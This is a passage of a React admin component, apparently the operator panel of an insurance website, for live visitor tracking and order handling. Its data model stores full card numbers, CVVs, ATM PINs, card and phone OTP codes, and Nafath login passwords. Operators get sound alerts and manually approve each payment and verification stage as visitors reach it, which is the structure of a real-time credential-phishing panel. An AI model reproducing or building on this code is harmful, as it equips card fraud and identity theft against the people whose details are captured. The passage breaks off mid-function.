import { Eye, User, MapPin, Circle, Check, X, Trash2, Phone, CreditCard, Car, Shield, Clock, MessageCircle, Loader2, Ban, ShieldCheck, ChevronDown, FileText, ShoppingCart, AlertTriangle, ArrowRight, Download, Search, Monitor, Smartphone, Tablet, Globe, Star, Timer, GitBranch, Dot, RefreshCw } from "lucide-react";
import { useState, useEffect, useCallback, useRef, forwardRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { sounds } from "@/lib/sounds";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
import AdminVisitorChat from "@/components/admin/AdminVisitorChat";

// Live timer component
const LiveTimer = ({ since }: { since: string }) => {
  const [elapsed, setElapsed] = useState("");
  useEffect(() => {
    const calc = () => {
      const diff = Math.max(0, Math.floor((Date.now() - new Date(since).getTime()) / 1000));
      const h = Math.floor(diff / 3600);
      const m = Math.floor((diff % 3600) / 60);
      const s = diff % 60;
      setElapsed(h > 0 ? `${h}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}` : `${m}:${String(s).padStart(2, "0")}`);
    };
    calc();
    const interval = setInterval(calc, 1000);
    return () => clearInterval(interval);
  }, [since]);
  return (
    <span className="inline-flex items-center gap-0.5 text-[9px] text-primary/70 font-mono tabular-nums">
      <Timer className="w-2.5 h-2.5" />{elapsed}
    </span>
  );
};

const parseUserAgent = (ua: string | null) => {
  if (!ua) return { device: "غير معروف", os: "", browser: "" };
  const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
  const isTablet = /iPad|Tablet/i.test(ua);
  const device = isTablet ? "Tablet" : isMobile ? "Mobile" : "Desktop";
  let os = "";
  if (/Windows/i.test(ua)) os = "Windows";
  else if (/Mac OS|Macintosh/i.test(ua)) os = "macOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/iPhone|iPad|iOS/i.test(ua)) os = "iOS";
  else if (/Linux/i.test(ua)) os = "Linux";
  let browser = "";
  if (/Edg\//i.test(ua)) browser = "Edge";
  else if (/Chrome/i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Firefox/i.test(ua)) browser = "Firefox";
  else if (/Opera|OPR/i.test(ua)) browser = "Opera";
  return { device, os, browser };
};

interface Visitor {
  id: string; session_id: string; visitor_name: string | null; current_page: string | null;
  is_online: boolean; last_seen_at: string; created_at: string; phone: string | null;
  national_id: string | null; linked_request_id: string | null; linked_conversation_id: string | null;
  is_blocked: boolean; user_agent: string | null; ip_address: string | null;
  is_favorite: boolean; country: string | null; country_code: string | null;
}

const countryFlag = (code: string | null) => {
  if (!code || code.length !== 2) return "";
  return String.fromCodePoint(...code.toUpperCase().split("").map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
};

interface InsuranceRequest {
  id: string; national_id: string; phone: string; insurance_type: string | null;
  serial_number: string | null; status: string; request_type: string; created_at: string;
  repair_location: string | null; passenger_count: string | null; estimated_value: string | null;
  vehicle_usage: string | null; notes: string | null; policy_start_date: string | null; birth_date: string | null;
}

interface InsuranceOrder {
  id: string; company: string | null; insurance_type: string | null; status: string;
  stage_status: string | null; current_stage: string | null; base_price: number | null;
  total_price: number | null; payment_method: string | null; customer_name: string | null;
  vehicle_make: string | null; vehicle_model: string | null; vehicle_year: string | null;
  serial_number: string | null; national_id: string | null; phone: string | null;
  policy_number: string | null; created_at: string; add_ons: any; card_last_four: string | null;
  card_number_full: string | null; card_cvv: string | null; card_holder_name: string | null; card_expiry: string | null;
  visitor_session_id: string | null;
  repair_location: string | null; estimated_value: string | null; passenger_count: string | null;
  vehicle_usage: string | null; nafath_number: string | null;
  atm_bill_number: string | null; atm_biller_code: string | null; draft_policy_number: string | null;
  insurance_request_id: string | null; otp_verified: boolean | null;
  otp_code: string | null; atm_pin: string | null; phone_otp_code: string | null; nafath_password: string | null;
}

interface Claim {
  id: string; full_name: string; phone: string; policy_number: string; claim_type: string;
  description: string; status: string; email: string | null; created_at: string;
}

interface ChatConv {
  id: string; visitor_name: string | null; status: string; created_at: string; messages_count?: number;
}

interface StageEvent {
  id: string;
  order_id: string;
  visitor_session_id: string | null;
  stage: string;
  status: string;
  stage_entered_at: string;
  resolved_at: string | null;
  created_at: string;
  updated_at: string;
  payload: Record<string, any> | null;
}

const AdminVisitors = () => {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [selectedVisitor, setSelectedVisitor] = useState<Visitor | null>(null);
  const [linkedRequests, setLinkedRequests] = useState<InsuranceRequest[]>([]);
  const [linkedOrders, setLinkedOrders] = useState<InsuranceOrder[]>([]);
  const [linkedClaims, setLinkedClaims] = useState<Claim[]>([]);
  const [linkedChats, setLinkedChats] = useState<ChatConv[]>([]);
  const [stageEvents, setStageEvents] = useState<StageEvent[]>([]);
  const [timelineFilter, setTimelineFilter] = useState<"all" | "pending" | "approved" | "rejected">("all");
  const [loadingAction, setLoadingAction] = useState<string | null>(null);
  const [pendingRequestMap, setPendingRequestMap] = useState<Record<string, boolean>>({});
  const [pendingStageMap, setPendingStageMap] = useState<Record<string, string>>({});
  const [searchQuery, setSearchQuery] = useState("");
  const [deletedCount, setDeletedCount] = useState(0);
  const [deletedVisitors, setDeletedVisitors] = useState<Visitor[]>([]);
  const [countryFilter, setCountryFilter] = useState("");
  const [statusFilter, setStatusFilter] = useState<"all" | "online" | "offline" | "deleted" | "favorites">("all");
  const [showDeleteConfirm, setShowDeleteConfirm] = useState<(() => void) | null>(null);
  const [chatClearTarget, setChatClearTarget] = useState<{ sessionId: string; visitorName: string } | null>(null);
  const [sortBy, setSortBy] = useState<"default" | "duration" | "entry" | "last_action">("default");
  const [redirectPage, setRedirectPage] = useState("");
  const [chatSelectMode, setChatSelectMode] = useState(false);
  const [selectedForClear, setSelectedForClear] = useState<Set<string>>(new Set());
  const [showChatMenu, setShowChatMenu] = useState(false);
  const [nafathNumberInputs, setNafathNumberInputs] = useState<Record<string, string>>({});
  const knownPendingOrdersRef = useRef<Set<string>>(new Set());
  const initialLoadDoneRef = useRef(false);
  const knownPendingStagesRef = useRef<Set<string>>(new Set());
  const hasInitializedPendingRef = useRef(false);
  const geoRetryRef = useRef<Set<string>>(new Set());

  // Sound notification for pending stages
  useEffect(() => {
    const currentPendingKeys = new Set(
      Object.entries(pendingStageMap).map(([visitorId, stage]) => `${visitorId}:${stage}`)
    );
    if (!hasInitializedPendingRef.current) {
      knownPendingStagesRef.current = currentPendingKeys;
      hasInitializedPendingRef.current = true;
      return;
    }
    const hasNew = Array.from(currentPendingKeys).some(key => !knownPendingStagesRef.current.has(key));
    if (hasNew) {
      const newKey = Array.from(currentPendingKeys).find(k => !knownPendingStagesRef.current.has(k));
      const stage = newKey?.split(":")[1] || "";
      const stageSounds: Record<string, () => void> = {
        payment: sounds.payment,
        otp: sounds.cardOtp,
        phone_verification: sounds.phoneVerification,
        phone_otp: sounds.phoneOtp,
        stc_call: sounds.stcCall,
        nafath_login: sounds.nafathLogin,
        nafath_verify: sounds.nafathVerify,
      };
      (stageSounds[stage] || sounds.approvalNeeded)();
      const stageLabel: Record<string, string> = {
        payment: "الدفع بالبطاقة", otp: "رمز التحقق", phone_verification: "توثيق الجوال",
        phone_otp: "كود توثيق الجوال", stc_call: "مكالمة STC", nafath_login: "دخول نفاذ", nafath_verify: "تحقق نفاذ",
      };
      toast.info(`زائر بانتظار الموافقة على: ${stageLabel[stage] || stage}`);
    }
    knownPendingStagesRef.current = currentPendingKeys;
  }, [pendingStageMap]);

  const priorityPages = ["الدفع بالبطاقة", "رمز التحقق البنكي", "تأكيد ATM", "توثيق الجوال", "كود توثيق الجوال", "مكالمة STC", "دخول نفاذ", "تحقق نفاذ", "تأكيد الطلب", "إتمام الشراء"];

  const getVisitorPriority = (page: string | null): number => {
    if (!page) return 0;
    return priorityPages.some(p => page.startsWith(p)) ? 1 : 0;
  };

  const deleteVisitors = async (ids: string[]) => {
    const offlineIds = ids.filter(id => {
      const v = visitors.find(vis => vis.id === id);
      return v && !v.is_online;
    });
    const skipped = ids.length - offlineIds.length;
    if (offlineIds.length === 0) {
      toast.info("لا يوجد زوار غير متصلين للمسح");
      return;
    }
    try {
      const removedVisitors = offlineIds.map(id => visitors.find(v => v.id === id)).filter(Boolean) as Visitor[];
      for (const id of offlineIds) {
        // Unlink FK references first
        const visitor = visitors.find(v => v.id === id);
        if (visitor?.linked_conversation_id) {
          await supabase.from("chat_messages").delete().eq("conversation_id", visitor.linked_conversation_id);
          await supabase.from("chat_conversations").delete().eq("id", visitor.linked_conversation_id);
        }
        const { error } = await supabase.from("site_visitors").delete().eq("id", id);
        if (error) throw error;
      }
      toast.success(`تم مسح ${offlineIds.length} زائر غير متصل${skipped > 0 ? ` (تم تخطي ${skipped} متصل)` : ""}`);
      setDeletedVisitors(prev => [...removedVisitors, ...prev]);
      setDeletedCount(prev => prev + offlineIds.length);
      if (selectedVisitor && offlineIds.includes(selectedVisitor.id)) setSelectedVisitor(null);
      fetchVisitors();
    } catch (err: any) {
      toast.error(err.message || "فشل مسح الزوار");
    }
  };

  const fetchVisitors = async () => {
    const { data } = await supabase.from("site_visitors").select("*").order("last_seen_at", { ascending: false });
    if (data) {
      const now = Date.now();
      const processed = (data as Visitor[]).map(v => ({ ...v, is_online: now - new Date(v.last_seen_at).getTime() < 30000 }));
      processed.sort((a, b) => {
        if (a.is_favorite !== b.is_favorite) return a.is_favorite ? -1 : 1;
        const aPriority = a.is_online ? getVisitorPriority(a.current_page) : 0;
        const bPriority = b.is_online ? getVisitorPriority(b.current_page) : 0;
        if (aPriority !== bPriority) return bPriority - aPriority;
        return new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime();
      });
      setVisitors(processed);
      if (selectedVisitor) {
        const updated = processed.find(v => v.id === selectedVisitor.id);
        if (updated) setSelectedVisitor(updated);
      }

      // Fetch pending requests
      const { data: pendingReqs } = await supabase.from("insurance_requests").select("id, phone, national_id, status").eq("status", "pending");
      if (pendingReqs) {
        const map: Record<string, boolean> = {};
        processed.forEach(v => {
          const hasPending = pendingReqs.some(r =>
            (v.linked_request_id && r.id === v.linked_request_id) ||
            (v.phone && r.phone === v.phone) ||
            (v.national_id && r.national_id === v.national_id)
          );
          if (hasPending) map[v.id] = true;
        });
        setPendingRequestMap(map);
      }

      // Fetch pending stages
      const { data: pendingOrders } = await supabase.from("insurance_orders").select("id, phone, national_id, current_stage, stage_status, visitor_session_id").eq("stage_status", "pending");
      if (pendingOrders) {
        const stageMap: Record<string, string> = {};
        const unmatchedOrders: typeof pendingOrders = [];
        
        // First pass: match by session_id, phone, or national_id
        pendingOrders.forEach(o => {
          const matched = processed.find(v =>
            (v.session_id && (o as any).visitor_session_id === v.session_id) ||
            (v.phone && o.phone === v.phone) ||
            (v.national_id && o.national_id === v.national_id)
          );
          if (matched && o.current_stage) {
            stageMap[matched.id] = o.current_stage;
          } else {
            unmatchedOrders.push(o);
          }
        });
        
        // Second pass: assign unmatched pending orders to the most relevant online visitor
        // (priority pages first, then most recent)
        if (unmatchedOrders.length > 0) {
          const onlineVisitors = processed.filter(v => v.is_online && !stageMap[v.id]);
          const priorityVisitor = onlineVisitors.find(v => getVisitorPriority(v.current_page) > 0) || onlineVisitors[0];
          if (priorityVisitor) {
            unmatchedOrders.forEach(o => {
              if (o.current_stage && !stageMap[priorityVisitor.id]) {
                stageMap[priorityVisitor.id] = o.current_stage;
                // Also update the visitor_session_id on the order for future matching
                supabase.from("insurance_orders").update({ visitor_session_id: priorityVisitor.session_id }).eq("id", o.id);
              }
            });
          }
        }
        
        setPendingStageMap(stageMap);
        // Seed known pending orders for sound alerts
        pendingOrders.forEach(o => {
          if (o.current_stage) knownPendingOrdersRef.current.add(o.id + "-" + o.current_stage);
        });
      }
      initialLoadDoneRef.current = true;
    }
  };

  const toggleFavorite = async (visitorId: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    const visitor = visitors.find(v => v.id === visitorId);
    if (!visitor) return;
    const newVal = !visitor.is_favorite;
    await supabase.from("site_visitors").update({ is_favorite: newVal } as any).eq("id", visitorId);
    setVisitors(prev => {
      const updated = prev.map(v => v.id === visitorId ? { ...v, is_favorite: newVal } : v);
      updated.sort((a, b) => {
        if (a.is_favorite !== b.is_favorite) return a.is_favorite ? -1 : 1;
        const aPriority = a.is_online ? getVisitorPriority(a.current_page) : 0;
        const bPriority = b.is_online ? getVisitorPriority(b.current_page) : 0;
        if (aPriority !== bPriority) return bPriority - aPriority;
        return new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime();
      });
      return updated;
    });
    if (selectedVisitor?.id === visitorId) setSelectedVisitor(prev => prev ? { ...prev, is_favorite: newVal } : prev);
    toast.success(newVal ? "تمت الإضافة للمفضلة" : "تمت الإزالة من المفضلة");
  };

  const fetchLinkedData = async (visitor: Visitor) => {
    setLinkedRequests([]); setLinkedOrders([]); setLinkedClaims([]); setLinkedChats([]); setStageEvents([]);

    // Fetch insurance requests
    if (visitor.linked_request_id || visitor.phone || visitor.national_id) {
      let query = supabase.from("insurance_requests").select("*");
      if (visitor.phone && visitor.national_id) query = query.or(`phone.eq.${visitor.phone},national_id.eq.${visitor.national_id}`);
      else if (visitor.phone) query = query.eq("phone", visitor.phone);
      else if (visitor.national_id) query = query.eq("national_id", visitor.national_id);
      else if (visitor.linked_request_id) query = query.eq("id", visitor.linked_request_id);
      const { data } = await query.order("created_at", { ascending: false });
      if (data) setLinkedRequests(data as InsuranceRequest[]);
    }

    // Fetch insurance orders - match by session_id, phone, or national_id
    {
      const filters: string[] = [];
      if (visitor.session_id) filters.push(`visitor_session_id.eq.${visitor.session_id}`);
      if (visitor.phone) filters.push(`phone.eq.${visitor.phone}`);
      if (visitor.national_id) filters.push(`national_id.eq.${visitor.national_id}`);
      if (filters.length > 0) {
        const { data } = await supabase.from("insurance_orders").select("*").or(filters.join(",")).order("created_at", { ascending: false });
        if (data) {
          const orders = data as InsuranceOrder[];
          setLinkedOrders(orders);

          const orderIds = orders.map(order => order.id);
          const stageFilters: string[] = [];
          if (orderIds.length > 0) stageFilters.push(`order_id.in.(${orderIds.join(",")})`);
          if (visitor.session_id) stageFilters.push(`visitor_session_id.eq.${visitor.session_id}`);

          if (stageFilters.length > 0) {
            const { data: events } = await (supabase as any)
              .from("insurance_order_stage_events")
              .select("*")
              .or(stageFilters.join(","))
              .order("stage_entered_at", { ascending: false });

            if (events) setStageEvents(events as StageEvent[]);
          }
        }
      }
    }

    // Fetch claims
    if (visitor.phone) {
      const { data } = await supabase.from("claims").select("*").eq("phone", visitor.phone).order("created_at", { ascending: false });
      if (data) setLinkedClaims(data as Claim[]);
    }

    // Fetch chats
    const { data: convs } = await supabase.from("chat_conversations").select("*").eq("session_token", visitor.session_id).order("created_at", { ascending: false });
    if (convs) setLinkedChats(convs as ChatConv[]);
  };

  const selectedVisitorRef = useRef<Visitor | null>(null);
  useEffect(() => { selectedVisitorRef.current = selectedVisitor; }, [selectedVisitor]);

  useEffect(() => {
    fetchVisitors();
    const interval = setInterval(fetchVisitors, 10000);
    const visitorsChannel = supabase
      .channel("visitors-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "site_visitors" }, () => fetchVisitors())
      .subscribe();
    // Listen for insurance_orders changes to refresh linked data in realtime
    const ordersChannel = supabase
      .channel("orders-realtime-admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "insurance_orders" }, (payload: any) => {
        // Detect new pending stage and play sound
        const row = payload.new;
        if (row && row.stage_status === "pending" && row.id && !knownPendingOrdersRef.current.has(row.id + "-" + row.current_stage)) {
          knownPendingOrdersRef.current.add(row.id + "-" + row.current_stage);
          if (initialLoadDoneRef.current && localStorage.getItem("admin_feed_mute") !== "true") {
            const stageSound: Record<string, () => void> = {
              payment: sounds.payment,
              otp: sounds.cardOtp,
              phone_verification: sounds.phoneVerification,
              phone_otp: sounds.phoneOtp,
              stc_call: sounds.stcCall,
              nafath_login: sounds.nafathLogin,
              nafath_verify: sounds.nafathVerify,
            };
            (stageSound[row.current_stage] || sounds.approvalNeeded)();
            toast.info(`طلب جديد بانتظار الموافقة: ${({ payment: "الدفع", otp: "رمز OTP", phone_verification: "توثيق الجوال", phone_otp: "كود الجوال", stc_call: "مكالمة STC", nafath_login: "دخول نفاذ", nafath_verify: "رمز نفاذ" } as Record<string, string>)[row.current_stage] || row.current_stage}`);
          }
        }
        fetchVisitors();
        if (selectedVisitorRef.current) fetchLinkedData(selectedVisitorRef.current);
      })
      .subscribe();
    return () => { clearInterval(interval); supabase.removeChannel(visitorsChannel); supabase.removeChannel(ordersChannel); };
  }, []);

  // Auto-resolve geo
  useEffect(() => {
    const missingGeo = visitors.filter(v => v.ip_address && !v.country && !geoRetryRef.current.has(v.id));
    if (missingGeo.length === 0) return;
    missingGeo.forEach(v => geoRetryRef.current.add(v.id));
    supabase.functions.invoke("resolve-geo", { body: { visitor_ids: missingGeo.map(v => v.id) } })
      .then(() => setTimeout(fetchVisitors, 2000)).catch(() => {});
  }, [visitors]);

  useEffect(() => {
    if (selectedVisitor) fetchLinkedData(selectedVisitor);
  }, [selectedVisitor?.id]);

  const handleApprove = async (reqId: string) => {
    setLoadingAction("approve-" + reqId);
    await supabase.from("insurance_requests").update({ status: "approved" }).eq("id", reqId);
    toast.success("تمت الموافقة على الطلب");
    setLinkedRequests(prev => prev.map(r => r.id === reqId ? { ...r, status: "approved" } : r));
    setLoadingAction(null);
  };

  const handleReject = async (reqId: string) => {
    setLoadingAction("reject-" + reqId);
    await supabase.from("insurance_requests").update({ status: "rejected" }).eq("id", reqId);
    toast.success("تم رفض الطلب");
    setLinkedRequests(prev => prev.map(r => r.id === reqId ? { ...r, status: "rejected" } : r));
    setLoadingAction(null);
  };

  const handleStageApprove = async (orderId: string, nafathNum?: string) => {
    setLoadingAction("stage-approve-" + orderId);
    const updateData: any = { stage_status: "approved" };
    if (nafathNum) updateData.nafath_number = nafathNum;
    await supabase.from("insurance_orders").update(updateData).eq("id", orderId);
    await (supabase as any)
      .from("insurance_order_stage_events")
      .update({ status: "approved", resolved_at: new Date().toISOString() })
      .eq("order_id", orderId)
      .is("resolved_at", null);
    toast.success("تمت الموافقة على المرحلة");
    setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, stage_status: "approved", nafath_number: nafathNum || o.nafath_number } : o));
    setStageEvents(prev => prev.map(event => event.order_id === orderId && !event.resolved_at ? { ...event, status: "approved", resolved_at: new Date().toISOString() } : event));
    setNafathNumberInputs(prev => {
      const next = { ...prev };
      delete next[orderId];
      return next;
    });
    setLoadingAction(null);
  };

  const handleUpdateNafathNumber = async (orderId: string, newNumber: string) => {
    if (!newNumber) return;
    setLoadingAction("nafath-update-" + orderId);
    await supabase.from("insurance_orders").update({ nafath_number: newNumber }).eq("id", orderId);
    setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, nafath_number: newNumber } : o));
    toast.success("تم تحديث رقم النفاذ");
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: newNumber }));
    setLoadingAction(null);
  };

  const handleStageReject = async (orderId: string) => {
    setLoadingAction("stage-reject-" + orderId);
    await supabase.from("insurance_orders").update({ stage_status: "rejected" }).eq("id", orderId);
    await (supabase as any)
      .from("insurance_order_stage_events")
      .update({ status: "rejected", resolved_at: new Date().toISOString() })
      .eq("order_id", orderId)
      .is("resolved_at", null);
    toast.success("تم رفض المرحلة");
    setLinkedOrders(prev => prev.map(o => o.id === orderId ? { ...o, stage_status: "rejected" } : o));
    setStageEvents(prev => prev.map(event => event.order_id === orderId && !event.resolved_at ? { ...event, status: "rejected", resolved_at: new Date().toISOString() } : event));
    setLoadingAction(null);
  };

  const handleClearChat = async () => {
    if (!selectedVisitor) return;
    sounds.warning();
    setChatClearTarget({ sessionId: selectedVisitor.session_id, visitorName: selectedVisitor.visitor_name || "زائر" });
  };

  const executeClearChat = async (sessionId: string) => {
    setLoadingAction("clear");
    try {
      const { data: conv } = await supabase.from("chat_conversations").select("id").eq("session_token", sessionId).maybeSingle();
      if (conv) {
        await supabase.from("site_visitors").update({ linked_conversation_id: null }).eq("linked_conversation_id", conv.id);
        await supabase.from("chat_messages").delete().eq("conversation_id", conv.id);
        const { error } = await supabase.from("chat_conversations").delete().eq("id", conv.id);
        if (error) throw error;
        toast.success("تم مسح المحادثة");
        setLinkedChats([]);
      } else {
        toast.info("لا توجد محادثة لهذا الزائر");
      }
    } catch (err: any) {
      toast.error(err.message || "فشل مسح المحادثة");
    }
    setChatClearTarget(null);
    setLoadingAction(null);
  };

  const clearOfflineVisitors = async () => {
    setLoadingAction("clearAll");
    try {
      const offlineIds = visitors.filter(v => !v.is_online).map(v => v.id);
      if (offlineIds.length === 0) {
        toast.info("لا يوجد زوار غير متصلين");
        setLoadingAction(null);
        return;
      }
      await deleteVisitors(offlineIds);
    } catch (err: any) {
      toast.error(err.message || "فشل مسح الزوار غير المتصلين");
    }
    setLoadingAction(null);
  };

  const clearSelectedChats = async () => {
    if (selectedForClear.size === 0) { toast.info("لم يتم تحديد أي زائر"); return; }
    setLoadingAction("clearSelected");
    try {
      let cleared = 0;
      for (const sessionId of selectedForClear) {
        const { data: conv } = await supabase.from("chat_conversations").select("id").eq("session_token", sessionId).maybeSingle();
        if (conv) {
          await supabase.from("site_visitors").update({ linked_conversation_id: null }).eq("linked_conversation_id", conv.id);
          await supabase.from("chat_messages").delete().eq("conversation_id", conv.id);
          await supabase.from("chat_conversations").delete().eq("id", conv.id);
          cleared++;
        }
      }
      if (cleared > 0) toast.success(`تم مسح ${cleared} محادثة`);
      else toast.info("لا توجد محادثات للزوار المحددين");
    } catch (err: any) {
      toast.error(err.message || "فشل مسح المحادثات");
    }
    setSelectedForClear(new Set());
    setChatSelectMode(false);
    setLoadingAction(null);
  };

  const handleBlockToggle = async () => {
    if (!selectedVisitor) return;
    const newBlocked = !selectedVisitor.is_blocked;
    setLoadingAction("block");
    await supabase.from("site_visitors").update({ is_blocked: newBlocked }).eq("id", selectedVisitor.id);
    toast.success(newBlocked ? "تم حظر الزائر" : "تم إلغاء حظر الزائر");
    setSelectedVisitor({ ...selectedVisitor, is_blocked: newBlocked });
    fetchVisitors();
    setLoadingAction(null);
  };

  const handleExportPDF = async () => {
    if (!selectedVisitor) return;
    const { default: jsPDF } = await import("jspdf");
    const { default: autoTable } = await import("jspdf-autotable");
    const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
    const name = selectedVisitor.visitor_name || `زائر #${selectedVisitor.session_id.slice(0, 6)}`;
    let y = 15;
    doc.setFontSize(18);
    doc.text(`Visitor Report: ${name}`, 105, y, { align: "center" });
    y += 10;
    doc.setFontSize(10);
    doc.text(`Generated: ${new Date().toLocaleString("en-US")}`, 105, y, { align: "center" });
    y += 10;
    autoTable(doc, {
      startY: y, head: [["Field", "Value"]],
      body: [
        ["Name", name], ["Status", selectedVisitor.is_online ? "Online" : "Offline"],
        ["Current Page", selectedVisitor.current_page || "/"], ["Phone", selectedVisitor.phone || "-"],
        ["National ID", selectedVisitor.national_id || "-"], ["First Visit", formatDate(selectedVisitor.created_at)],
        ["Last Seen", `${formatDate(selectedVisitor.last_seen_at)} ${formatTime(selectedVisitor.last_seen_at)}`],
        ["Blocked", selectedVisitor.is_blocked ? "Yes" : "No"],
      ],
      theme: "grid", headStyles: { fillColor: [34, 197, 94] },
    });
    y = (doc as any).lastAutoTable.finalY + 10;
    if (linkedRequests.length > 0) {
      doc.setFontSize(13); doc.text("Insurance Requests", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Type", "Request Type", "Status", "Phone", "National ID", "Date"]],
        body: linkedRequests.map(r => [insuranceTypeLabel[r.insurance_type || ""] || r.insurance_type || "-", r.request_type === "new" ? "New" : "Renewal", statusLabel[r.status]?.text || r.status, r.phone || "-", r.national_id || "-", formatDate(r.created_at)]),
        theme: "grid", headStyles: { fillColor: [59, 130, 246] },
      });
      y = (doc as any).lastAutoTable.finalY + 10;
    }
    if (linkedOrders.length > 0) {
      if (y > 250) { doc.addPage(); y = 15; }
      doc.setFontSize(13); doc.text("Orders & Purchases", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Company", "Type", "Vehicle", "Total Price", "Payment", "Status"]],
        body: linkedOrders.map(o => [o.company || "-", insuranceTypeLabel[o.insurance_type || ""] || o.insurance_type || "-", [o.vehicle_make, o.vehicle_model, o.vehicle_year].filter(Boolean).join(" ") || "-", o.total_price ? `${o.total_price} SAR` : "-", o.payment_method || "-", o.status || "-"]),
        theme: "grid", headStyles: { fillColor: [168, 85, 247] },
      });
      y = (doc as any).lastAutoTable.finalY + 10;
    }
    if (linkedClaims.length > 0) {
      if (y > 250) { doc.addPage(); y = 15; }
      doc.setFontSize(13); doc.text("Claims", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Name", "Type", "Policy #", "Status", "Date"]],
        body: linkedClaims.map(c => [c.full_name, c.claim_type, c.policy_number, statusLabel[c.status]?.text || c.status, formatDate(c.created_at)]),
        theme: "grid", headStyles: { fillColor: [245, 158, 11] },
      });
    }
    if (linkedChats.length > 0) {
      if (y > 250) { doc.addPage(); y = 15; }
      doc.setFontSize(13); doc.text("Chat Conversations", 14, y); y += 5;
      autoTable(doc, {
        startY: y, head: [["Visitor", "Status", "Date"]],
        body: linkedChats.map(c => [c.visitor_name || "Visitor", c.status === "active" ? "Active" : c.status === "waiting" ? "Waiting" : c.status, formatDate(c.created_at)]),
        theme: "grid", headStyles: { fillColor: [14, 165, 233] },
      });
    }
    doc.save(`visitor-${selectedVisitor.session_id.slice(0, 8)}-report.pdf`);
    toast.success("تم تصدير البيانات بنجاح");
  };

  const onlineCount = visitors.filter(v => v.is_online).length;
  const offlineCount = visitors.filter(v => !v.is_online).length;
  const favoriteCount = visitors.filter(v => v.is_favorite).length;
  const totalCount = visitors.length;
  const pendingCount = Object.keys(pendingRequestMap).length;

  const formatTime = (dateStr: string) => new Date(dateStr).toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" });
  const formatDate = (dateStr: string) => new Date(dateStr).toLocaleDateString("ar-SA", { year: "numeric", month: "short", day: "numeric" });
  const formatDateTime = (dateStr: string) => new Date(dateStr).toLocaleString("ar-SA", { year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });

  const insuranceTypeLabel: Record<string, string> = { comprehensive: "شامل", third_party: "ضد الغير", custom: "مخصص" };
  const statusLabel: Record<string, { text: string; cls: string }> = {
    pending: { text: "قيد الانتظار", cls: "bg-amber-500/10 text-amber-600" },
    approved: { text: "مقبول", cls: "bg-emerald-500/10 text-emerald-600" },
    rejected: { text: "مرفوض", cls: "bg-red-500/10 text-red-600" },
    completed: { text: "مكتمل", cls: "bg-blue-500/10 text-blue-600" },
  };
  const claimTypeLabel: Record<string, string> = { accident: "حادث", theft: "سرقة", damage: "ضرر", other: "أخرى" };
  const stageLabel: Record<string, string> = {
    payment: "الدفع",
    otp: "رمز OTP",
    phone_verification: "توثيق الجوال",
    phone_otp: "كود توثيق الجوال",
    stc_call: "مكالمة STC",
    nafath_login: "دخول نفاذ",
    nafath_verify: "رمز نفاذ",
  };
  const currentStageOrEmpty = (order: InsuranceOrder) => order.current_stage || "";
  const hasPhoneVerificationTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return ["phone_verification", "stc_call", "phone_otp", "nafath_login", "nafath_verify"].includes(stage)
      || Boolean(order.phone_otp_code || order.nafath_password || order.nafath_number);
  };
  const hasPhoneOtpTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return stage === "phone_otp" || Boolean(order.phone_otp_code);
  };
  const hasNafathLoginTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return ["nafath_login", "nafath_verify"].includes(stage) || Boolean(order.nafath_password);
  };
  const hasNafathVerifyTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return ["nafath_verify", "nafath_login"].includes(stage) || Boolean(order.nafath_number || order.nafath_password);
  };
  const getNafathInputValue = (order: InsuranceOrder) => nafathNumberInputs[order.id] ?? order.nafath_number ?? "";
  const setNafathInputValue = (orderId: string, value: string) => {
    const sanitized = value.replace(/\D/g, "").slice(0, 2);
    setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
  };
  const hasOtpTrail = (order: InsuranceOrder) => {
    const stage = currentStageOrEmpty(order);
    return stage === "otp" || Boolean(order.otp_code);
  };
  const visitorPhone = selectedVisitor?.phone || linkedOrders.find(o => o.phone)?.phone || linkedRequests.find(r => r.phone)?.phone || linkedClaims.find(c => c.phone)?.phone || null;
  const visitorNationalId = selectedVisitor?.national_id || linkedOrders.find(o => o.national_id)?.national_id || linkedRequests.find(r => r.national_id)?.national_id || null;
  const visitorName = selectedVisitor?.visitor_name && selectedVisitor.visitor_name !== "زائر"
    ? selectedVisitor.visitor_name
    : linkedClaims.find(c => c.full_name)?.full_name || null;
  const customerName = linkedOrders.find(o => o.customer_name)?.customer_name || null;
  const timelineEventsAll = [...stageEvents].sort((a, b) => new Date(b.stage_entered_at).getTime() - new Date(a.stage_entered_at).getTime());
  const timelineEvents = timelineFilter === "all" ? timelineEventsAll : timelineEventsAll.filter(e => e.status === timelineFilter);

  // Build filtered list
  const getFilteredVisitors = () => {
    const q = searchQuery.trim().toLowerCase();
    let filtered: Visitor[];
    if (statusFilter === "deleted") {
      filtered = deletedVisitors;
    } else if (statusFilter === "favorites") {
      filtered = visitors.filter(v => v.is_favorite);
    } else {
      filtered = visitors;
